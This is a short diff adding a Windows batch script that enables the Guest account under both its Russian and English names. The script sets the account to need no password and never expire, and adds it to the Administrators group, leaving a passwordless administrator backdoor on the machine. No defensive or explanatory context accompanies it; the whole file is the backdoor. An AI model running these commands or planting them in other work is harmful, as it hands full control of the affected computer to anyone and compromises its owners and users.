@@ -1,0 +1,5 @@
+@net user Гость /ACTIVE:YES /EXPIRES:NEVER /PASSWORDREQ:no /WORKSTATIONS:*
+@net localgroup Администраторы /add Гость
+@net user Guest /ACTIVE:YES /EXPIRES:NEVER /PASSWORDREQ:no /WORKSTATIONS:*
+@net localgroup Administrators /add Guest
+exit
